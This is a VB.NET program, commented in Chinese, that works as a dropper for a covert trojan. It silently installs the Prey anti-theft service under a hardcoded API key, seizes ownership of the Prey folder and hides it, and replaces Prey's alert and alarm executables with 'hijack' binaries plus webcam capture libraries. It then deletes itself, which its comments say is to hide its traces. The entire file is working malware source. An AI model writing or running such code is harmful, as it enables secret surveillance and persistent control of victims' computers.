Imports System.IO
Imports System.Security.Principal
Imports Microsoft.VisualBasic.ApplicationServices

Namespace My
    ' 以下事件可用于 MyApplication: 
    ' Startup: 应用程序启动时在创建启动窗体之前引发。
    ' Shutdown: 在关闭所有应用程序窗体后引发。 如果应用程序异常终止，则不会引发此事件。
    ' UnhandledException: 在应用程序遇到未经处理的异常时引发。
    ' StartupNextInstance: 在启动单实例应用程序且应用程序已处于活动状态时引发。
    ' NetworkAvailabilityChanged: 在连接或断开网络连接时引发。
    Partial Friend Class MyApplication
        'Prey MSI 静默安装程序下载地址：
        'https://github.com/prey/prey-node-client/releases
        '静默安装帮助：
        'http://help.preyproject.com/article/188-prey-unattended-install-for-computers

        '调用 [映像文件]
        Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Integer, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Integer) As Integer
        Dim MySelfPath As String = IO.Path.GetTempPath() & "winscr" & My.Computer.Clock.TickCount & ".exe"
        Dim PreyMSIPath As String = IO.Path.GetTempPath() & "Prey.msi"
        Dim PreyDirectory As String = Environment.GetFolderPath(Environment.SpecialFolder.Windows) & "\Prey"
        Dim PreyVireion As String
        Dim FlashDirectory As String
        Dim AlarmDirectory As String
        Dim APIKEY As String = "A4E064ED041C"

        Private Sub MyApplication_Startup(sender As Object, e As StartupEventArgs) Handles Me.Startup
            '如果启动不包含参数，则把程序复制到临时目录，并加入参数运行
            If Command() = vbNullString Then
                If IO.File.Exists(MySelfPath) Then IO.File.Delete(MySelfPath)
                FileSystem.FileCopy(Process.GetCurrentProcess.MainModule.FileName, MySelfPath)
                '不等待宿主程序退出而退出
                ShellExecute(0, "runas", MySelfPath, "winscr", vbNullString, vbHide)
                End
            End If

            ''检查管理员权限
            If Not (New WindowsPrincipal(WindowsIdentity.GetCurrent).IsInRole(New SecurityIdentifier(WellKnownSidType.BuiltinAdministratorsSid, Nothing))) Then
                MsgBox("此程序需要管理员权限，请右击程序文件，选择""以管理员权限运行""。")
                End
            End If

            '释放 MSI 安装文件
            If Not SaveResourceFile(My.Resources.BinaryResource.prey, PreyMSIPath) Then End

            '静默安装 Prey 服务
            If Not InstallMSI() Then End

            '安装完毕后删除 MSI 安装程序
            If IO.File.Exists(PreyMSIPath) Then IO.File.Delete(PreyMSIPath)

            '使用管理员权限对整个目标目录提权，方便日后寄生程序的静默更新
            '参数"/d y"表示对子目录进行循环遍历提权，大概需要 半分钟 时间，如不需要对子目录循环遍历提权，把 "/d y" 改为 "/d n"
            Shell("cmd.exe /c takeown /f " & PreyDirectory & " /r /d y && icacls " & PreyDirectory & " /grant administrators:F /t", vbHide, True)
            '对 Prey 目录添加 [系统] 和 [隐藏] 属性，防止用户无意发现文件
            Shell("cmd.exe /c attrib " & PreyDirectory & " +s +h", vbHide, True)

            PreyVireion = GetHighestVersion(PreyDirectory & "\versions\")
            FlashDirectory = PreyDirectory & "\versions\" & PreyVireion & "\lib\agent\actions\alert\win32\"
            AlarmDirectory = PreyDirectory & "\versions\" & PreyVireion & "\lib\agent\actions\alarm\bin\"

            '删除 Alarm 目录里的两个 exe ，劫持以实现恢复木马
            'If IO.File.Exists(AlarmDirectory & "mpg123.exe") Then IO.File.Delete(AlarmDirectory & "mpg123.exe")
            'If IO.File.Exists(AlarmDirectory & "voladjust.exe") Then IO.File.Delete(AlarmDirectory & "voladjust.exe")

            '释放劫持程序
            SaveResourceFile(My.Resources.BinaryResource.alert, FlashDirectory & "alert.exe")
            SaveResourceFile(My.Resources.BinaryResource.AForge_Video, FlashDirectory & "AForge.Video.dll")
            SaveResourceFile(My.Resources.BinaryResource.AForge_Video_DirectShow, FlashDirectory & "AForge.Video.DirectShow.dll")
            SaveResourceFile(My.Resources.BinaryResource.Microsoft_DirectX, FlashDirectory & "Microsoft.DirectX.dll")
            SaveResourceFile(My.Resources.BinaryResource.Microsoft_DirectX_DirectSound, FlashDirectory & "Microsoft.DirectX.DirectSound.dll")
            SaveResourceFile(System.Text.Encoding.UTF8.GetBytes(My.Resources.BinaryResource.flash_exe), FlashDirectory & "flash.exe.config")
            SaveResourceFile(My.Resources.BinaryResource.Flash, FlashDirectory & "flash.exe")
            SaveResourceFile(My.Resources.BinaryResource.Flash, AlarmDirectory & "flash_bak")
            SaveResourceFile(My.Resources.BinaryResource.voladjust, AlarmDirectory & "voladjust.exe")

            '使用 [update] 参数调用 寄生程序 ，接收安装/更新成功提示邮件
            ShellExecute(0, vbNullString, FlashDirectory & "flash.exe", "update", vbNullString, vbHide)

            '结束程序并自动删除自身文件，以隐藏痕迹
            DeleteMySelf()
        End Sub

        '' <summary>
        '' 保存资源文件里的文件到硬盘
        '' </summary>
        '' <param name="ResourceByte">资源文件的指定资源</param>
        '' <param name="FilePath">储存路径</param>
        '' <return>检测文件是否释放成功</return>
        Private Function SaveResourceFile(ResourceByte() As Byte, FilePath As String) As Boolean
            '删除已经存在的文件，防止文件冲突
            If IO.File.Exists(FilePath) Then IO.File.Delete(FilePath)

            Dim ResourceStream As IO.FileStream = New IO.FileStream(FilePath, IO.FileMode.Create, IO.FileAccess.Write)

            Try
                ResourceStream.Write(ResourceByte, 0, ResourceByte.Length)
            Catch ex As Exception
                ResourceStream.Dispose()
                Return False
            End Try

            ResourceStream.Dispose()
            Return IO.File.Exists(FilePath)
        End Function

        ''' <summary>
        ''' 静默安装 Prey.msi
        ''' </summary>
        ''' <returns></returns>
        Private Function InstallMSI() As Boolean
            '静默安装：
            'msiexec.exe /i prey-windows-1.X.X-xxx.msi /lv installer.log /q AGREETOLICENSE=yes API_KEY=foobar123
            '安装完成后提示： "/q" 改为 "/qn+"
            'msiexec.exe /i prey-windows-1.X.X-xxx.msi /lv installer.log /qn+ AGREETOLICENSE=yes API_KEY=foobar123
            '跳过账户验证：计算机未连接网络会导致账户验证失败，添加 "SKIP_VALIDATION=yes"
            'msiexec.exe /i prey-windows-1.X.X-xxx.msi /lv installer.log /q AGREETOLICENSE=yes API_KEY=foobar123 SKIP_VALIDATION=yes

            '生成安装命令
            Dim ShellCommand As String = "msiexec.exe /i " & PreyMSIPath & " /q AGREETOLICENSE=yes API_KEY=" & APIKEY
            '尝试检测与 Prey 服务器的连通性
            Try
                '当无法连接到 Prey 验证服务器时，需要跳过账户验证
                If Not My.Computer.Network.Ping("www.preyproject.com") Then ShellCommand &= " SKIP_VALIDATION=yes"
            Catch ex As Exception
                '当 Ping 命令失败时，同样暂时跳过账户验证
                ShellCommand &= " SKIP_VALIDATION=yes"
            End Try
            '宿主程序具有管理员权限，所以不需要使用 ShellExecute ，方便等待进程结束
            Shell(ShellCommand, AppWinStyle.Hide, True)
            '使用 [被寄生程序] 是否存在作为返回值
            Return IO.File.Exists(FlashDirectory & "Flash.exe")
        End Function

        ''' <summary>
        ''' 结束程序并自动删除自身，以隐藏痕迹
        ''' </summary>
        Private Sub DeleteMySelf()
            Dim CommandString As String = """" & Process.GetCurrentProcess.MainModule.FileName & """"
            Shell("cmd /c for /l %a in (0,0,0) do if exist " & CommandString & " (del/a/f " & CommandString & ") else exit", vbHide)
            End
        End Sub

        ''' <summary>
        ''' 获取软件目录里最新版本目录名称
        ''' </summary>
        Private Function GetHighestVersion(SoftwareDirectory As String) As String
            Dim VersionDir() As String = Directory.GetDirectories(SoftwareDirectory)
            If VersionDir.Length = 1 Then Return Path.GetFileName(VersionDir.First)
            Dim HighVersion As Version = New Version("0.0.0")
            Dim TempVersion As Version
            For Each VersionStr In VersionDir
                TempVersion = New Version(Path.GetFileName(VersionStr))
                HighVersion = IIf(TempVersion > HighVersion, TempVersion, HighVersion)
            Next
            Return HighVersion.ToString()
        End Function
    End Class
End Namespace
